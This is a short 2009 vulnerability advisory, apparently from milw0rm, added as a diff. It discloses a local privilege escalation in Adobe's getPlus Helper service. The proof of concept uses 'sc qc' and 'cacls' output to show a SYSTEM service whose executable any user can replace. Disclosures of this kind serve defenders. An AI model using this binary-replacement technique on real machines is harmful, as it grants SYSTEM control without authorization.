@@ -1,0 +1,36 @@
+Adobe related service (getPlus_HelperSvc.exe) local elevation of privileges
+by Nine:Situations:Group
+site: http://retrogod.altervista.org/
+
+description:
+Adobe downloader used to download updates for Adobe applications.
+Shipped with Acrobat Reader 9.x
+
+vendor: Nos Microsystems
+
+poc:
+
+C:\>sc qc "getPlus(R) Helper"
+[SC] GetServiceConfig SUCCESS
+
+SERVICE_NAME: getPlus(R) Helper
+        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Programmi\NOS\bin\getPlus_HelperSvc.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : getPlus(R) Helper
+        DEPENDENCIES       : RPCSS
+        SERVICE_START_NAME : LocalSystem
+
+C:\>cacls "C:\Programmi\NOS\bin\getPlus_HelperSvc.exe"
+C:\Programmi\NOS\bin\getPlus_HelperSvc.exe BUILTIN\Users:F <-------------- [!!!]
+                                           NT AUTHORITY\SYSTEM:F
+
+The executable file is installed with improper permissions, with "full
+control" for Builtin Users; a simple user can replace it with a binary of
+choice.
+At the next reboot it will run with SYSTEM privileges.
+
+# milw0rm.com [2009-07-20]
